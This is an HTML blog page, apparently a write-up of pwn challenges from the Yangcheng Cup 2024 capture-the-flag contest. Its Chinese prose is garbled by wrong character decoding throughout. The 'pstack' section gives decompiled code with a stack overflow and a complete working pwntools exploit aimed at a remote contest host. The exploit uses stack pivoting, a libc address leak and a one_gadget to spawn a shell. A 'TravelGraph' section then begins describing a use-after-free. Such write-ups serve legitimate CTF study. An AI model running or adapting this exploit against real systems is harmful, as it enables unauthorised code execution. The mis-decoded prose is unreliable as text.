<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ÂéªÂπ¥Â∞±Áü•ÈÅìËøô‰∏™ÊØîËµõÂæàÂç∑ÔºåÊ≤°ÊÉ≥Âà∞‰ªäÂπ¥Êõ¥Âç∑„ÄÇÊüêÊüêÊàòÈòüË∑ùÁ¶ªÊØîËµõÁªìÊùüËøòÊúâ40ÂàÜÈíüÊó∂ÊéíÂêçÁ¨¨‰∏ÄÔºåÊØîËµõÁªìÊùüÊó∂ÊéíÁ¨¨‰∫åÂçÅ‰∏ÄÔºåÁúüÁöÑÈÄÜÂ§©„ÄÇËøôÊ¨°ÊØîËµõÂ≠¶Èïø‰∏çÊòØÂú®ÂÆû‰π†Â∞±ÊòØÂéªÂ∏ÆÂà´ÁöÑÊàòÈòüÊâìÔºåÂà∞Â§¥Êù•pwnÂÖ®ÈÉΩÂè™ËÉΩÊàë‰∏Ä‰∏™‰∫∫Êù•ÊâìÔºåÁúüÁöÑÂ•ΩÁ¥ØÂñµüòá„ÄÇËøòÂ•ΩÈ¢òÁõÆ‰∏çÊòØÂæàÈöæÔºå‰∏ÄÂÖ±‰∫îÈ¢òpwnÔºåÂâç4È¢òÂæàÂø´Â∞±ÊâìÂÆå‰∫ÜÔºåÊúÄÂêé‰∏ÄÈ¢òÂ∑®ÊäΩË±°ÔºåÊú¨Âú∞‰∏çÂêåÁöÑÊâìÊ≥ïÈÉΩÈÄö‰∫ÜÔºåËøúÁ®ãÊ≠ªÊ¥ª‰∏çÂêåÔºåÁúüÊòØËÆ©‰∫∫ÈÅìÂøÉÁ†¥Á¢éÊçè„ÄÇ pstackËøôÊòØÊú¨Ê¨°ÊØîËµõÁöÑÁ≠æÂà∞È¢òÔºå‰∏ªÈÄªËæëÂ¶Ç‰∏ãÔºö 12345678">
<meta property="og:type" content="article">
<meta property="og:title" content="ÁæäÂüéÊùØ 2024 pwn writeup">
<meta property="og:url" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="ÂéªÂπ¥Â∞±Áü•ÈÅìËøô‰∏™ÊØîËµõÂæàÂç∑ÔºåÊ≤°ÊÉ≥Âà∞‰ªäÂπ¥Êõ¥Âç∑„ÄÇÊüêÊüêÊàòÈòüË∑ùÁ¶ªÊØîËµõÁªìÊùüËøòÊúâ40ÂàÜÈíüÊó∂ÊéíÂêçÁ¨¨‰∏ÄÔºåÊØîËµõÁªìÊùüÊó∂ÊéíÁ¨¨‰∫åÂçÅ‰∏ÄÔºåÁúüÁöÑÈÄÜÂ§©„ÄÇËøôÊ¨°ÊØîËµõÂ≠¶Èïø‰∏çÊòØÂú®ÂÆû‰π†Â∞±ÊòØÂéªÂ∏ÆÂà´ÁöÑÊàòÈòüÊâìÔºåÂà∞Â§¥Êù•pwnÂÖ®ÈÉΩÂè™ËÉΩÊàë‰∏Ä‰∏™‰∫∫Êù•ÊâìÔºåÁúüÁöÑÂ•ΩÁ¥ØÂñµüòá„ÄÇËøòÂ•ΩÈ¢òÁõÆ‰∏çÊòØÂæàÈöæÔºå‰∏ÄÂÖ±‰∫îÈ¢òpwnÔºåÂâç4È¢òÂæàÂø´Â∞±ÊâìÂÆå‰∫ÜÔºåÊúÄÂêé‰∏ÄÈ¢òÂ∑®ÊäΩË±°ÔºåÊú¨Âú∞‰∏çÂêåÁöÑÊâìÊ≥ïÈÉΩÈÄö‰∫ÜÔºåËøúÁ®ãÊ≠ªÊ¥ª‰∏çÂêåÔºåÁúüÊòØËÆ©‰∫∫ÈÅìÂøÉÁ†¥Á¢éÊçè„ÄÇ pstackËøôÊòØÊú¨Ê¨°ÊØîËµõÁöÑÁ≠æÂà∞È¢òÔºå‰∏ªÈÄªËæëÂ¶Ç‰∏ãÔºö 12345678">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/6.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/7.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/8.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/9.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/10.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/11.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png">
<meta property="og:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png">
<meta property="article:published_time" content="2024-08-27T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-31T04:56:26.588Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>ÁæäÂüéÊùØ 2024 pwn writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/07/kno_puts/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&text=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&is_video=false&description=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ÁæäÂüéÊùØ 2024 pwn writeup&body=Check out this article: https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&title=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&name=ÁæäÂüéÊùØ 2024 pwn writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/&t=ÁæäÂüéÊùØ 2024 pwn writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pstack"><span class="toc-number">1.</span> <span class="toc-text">pstack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TravelGraph"><span class="toc-number">2.</span> <span class="toc-text">TravelGraph</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpd"><span class="toc-number">3.</span> <span class="toc-text">httpd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logger"><span class="toc-number">4.</span> <span class="toc-text">logger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox-after-competition"><span class="toc-number">5.</span> <span class="toc-text">sandbox(after competition)</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ÁæäÂüéÊùØ 2024 pwn writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-27T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-28</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>ÂéªÂπ¥Â∞±Áü•ÈÅìËøô‰∏™ÊØîËµõÂæàÂç∑ÔºåÊ≤°ÊÉ≥Âà∞‰ªäÂπ¥Êõ¥Âç∑„ÄÇÊüêÊüêÊàòÈòüË∑ùÁ¶ªÊØîËµõÁªìÊùüËøòÊúâ40ÂàÜÈíüÊó∂ÊéíÂêçÁ¨¨‰∏ÄÔºåÊØîËµõÁªìÊùüÊó∂ÊéíÁ¨¨‰∫åÂçÅ‰∏ÄÔºåÁúüÁöÑÈÄÜÂ§©„ÄÇ<br>ËøôÊ¨°ÊØîËµõÂ≠¶Èïø‰∏çÊòØÂú®ÂÆû‰π†Â∞±ÊòØÂéªÂ∏ÆÂà´ÁöÑÊàòÈòüÊâìÔºåÂà∞Â§¥Êù•pwnÂÖ®ÈÉΩÂè™ËÉΩÊàë‰∏Ä‰∏™‰∫∫Êù•ÊâìÔºåÁúüÁöÑÂ•ΩÁ¥ØÂñµüòá„ÄÇËøòÂ•ΩÈ¢òÁõÆ‰∏çÊòØÂæàÈöæÔºå‰∏ÄÂÖ±‰∫îÈ¢òpwnÔºåÂâç4È¢òÂæàÂø´Â∞±ÊâìÂÆå‰∫ÜÔºåÊúÄÂêé‰∏ÄÈ¢òÂ∑®ÊäΩË±°ÔºåÊú¨Âú∞‰∏çÂêåÁöÑÊâìÊ≥ïÈÉΩÈÄö‰∫ÜÔºåËøúÁ®ãÊ≠ªÊ¥ª‰∏çÂêåÔºåÁúüÊòØËÆ©‰∫∫ÈÅìÂøÉÁ†¥Á¢éÊçè„ÄÇ</p>
<h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>ËøôÊòØÊú¨Ê¨°ÊØîËµõÁöÑÁ≠æÂà∞È¢òÔºå‰∏ªÈÄªËæëÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start the construction for stack overflow exploit.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂ≠òÂú®<code>0x10</code>Â≠óËäÇÁöÑÊ∫¢Âá∫„ÄÇÁî±‰∫éÂè™ËÉΩË¶ÜÁõñ<code>rbp</code>Âíå<code>ret</code>ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊ†àËøÅÁßªÔºåÁÑ∂Âêé<code>ret2libc</code>ÔºåËøôÈáåÊàëÊ†àËøÅÁßª‰∫Ü2Ê¨°ÔºåÁ¨¨‰∏ÄÊ¨°Áî®Êù•Ê≥ÑÈú≤Âú∞ÂùÄÔºåÁ¨¨‰∫åÊ¨°Áî®Êù•getshell„ÄÇÂèØÊòØ‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÁéØÂ¢ÉÁöÑÈóÆÈ¢òÔºåÊàëÊú¨Âú∞Êâì<code>system(&quot;/bin/sh&quot;)</code>Ê≠ªÊ¥ªÈÉΩ‰∏çÈÄöÔºåÊâì<code>execve(&quot;/bin/sh&quot;,0,0)</code>ÂèëÁé∞Ê†àËøÅÁßªÂêéÊ∫¢Âá∫ÁöÑÂ≠óËäÇ‰∏çÂ§üÊàëÂÜôropÈìæÔºåÊúÄÂêéÂè™ËÉΩ‰ΩøÁî®libc‰∏äÁöÑgadgetÊù•‰ΩøÂÖ∂Êª°Ë∂≥ÂÖ∂‰∏≠‰∏Ä‰∏™<code>one_gadget</code>Êù•getshellüòá<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">31213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601500</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(ret)+p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ogg)):</span><br><span class="line">    ogg[i] += libc_base</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601700</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_r13 = <span class="number">0x0000000000041c4a</span> + libc_base</span><br><span class="line">pop_r12 = <span class="number">0x0000000000035731</span> + libc_base</span><br><span class="line">pop_rbp = <span class="number">0x000000000002a2e0</span> + libc_base</span><br><span class="line">execve = libc.symbols[<span class="string">&#x27;execve&#x27;</span>] + libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rbp)+p64(<span class="number">0x601780</span>)+p64(ogg[<span class="number">5</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>ËøôÊòØÊú¨Ê¨°ÊØîËµõÂîØ‰∏ÄÁöÑÂ†ÜÈ£éÊ∞¥È¢òÔºåÂÖ∂È¢òÁõÆÂ§ßÊ¶ÇÁöÑÊÑèÊÄùÊòØËÆ©Êàë‰ª¨ËæìÂÖ•Ë∑ØÂæÑÔºåÁÑ∂ÂêéÊúâ‰∏™ÂáΩÊï∞Âè´<code>Dijkstra</code>Áî®Êù•ËÆ°ÁÆóÊúÄÁü≠Ë∑ØÂä≤ÔºåËøôÈáåÂÖàÁúãÂ†ÜÂùóÊòØÁî≥ËØ∑ÁöÑ</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>ÂèØ‰ª•ÁúãËßÅÂ†ÜÂùóÁöÑÂ§ßÂ∞èÂíåÊàë‰ª¨ÈÄâÁî®ÁöÑ‰∫§ÈÄöÂ∑•ÂÖ∑ÊúâÂÖ≥Á≥ªÔºåËÉΩÁî≥ËØ∑ÁöÑÂ†ÜÂùóÂ§ßÂ∞èÊúâ<code>0x520/0x530/0x540</code></p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>freeÂáΩÊï∞‰∏≠Â≠òÂú®ÂçÅÂàÜÊòéÊòæÁöÑ<code>UAF</code>ÊºèÊ¥û</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>editÂáΩÊï∞Âè™ËÉΩÂ§ü‰ΩøÁî®‰∏ÄÊ¨°ÔºåËÄå‰∏îÂú®‰ΩøÁî®ÂâçÈúÄË¶ÅÊª°Ë∂≥<code>edit_flag2</code>ÂèòÈáèÁöÑÂÄº‰∏∫<code>true</code>ÔºåËøô‰∏™ÂèòÈáèÁöÑÂÄºÂèØ‰ª•ÈÄöËøá<code>Dijkstra</code>ÂáΩÊï∞ËÆ°ÁÆóÂΩìÂâçÂüéÂ∏ÇË∑ùÁ¶ª<code>guangzhou</code>ÁöÑË∑ùÁ¶ªÊòØÂê¶Â§ß‰∫é<code>2000</code>Êù•ÊîπÂèò</p>
